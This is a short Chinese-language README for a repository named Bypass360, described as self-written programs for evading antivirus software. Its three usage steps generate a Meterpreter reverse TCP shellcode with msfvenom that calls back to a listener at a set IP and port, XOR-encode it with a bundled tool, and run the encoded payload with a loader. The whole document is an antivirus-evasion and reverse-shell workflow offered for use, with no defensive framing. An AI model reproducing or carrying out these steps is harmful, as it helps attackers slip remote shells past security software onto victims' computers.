# Bypass360
该仓库用于放置自己编写绕过杀软的程序
使用方法：
1.用MSF生成完整的shellcode：msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.43.147 lport=4444 -f raw > beacon.bin
2.然后用XorEncode.exe加密生成的shellcode文件：XorEncode.exe beacon.bin，结果会生成一个EncodeRAWData
3.最后用ProcessTest.exe执行加密后的文件EncodeRAWData：ProcessTest.exe EncodeRAWData
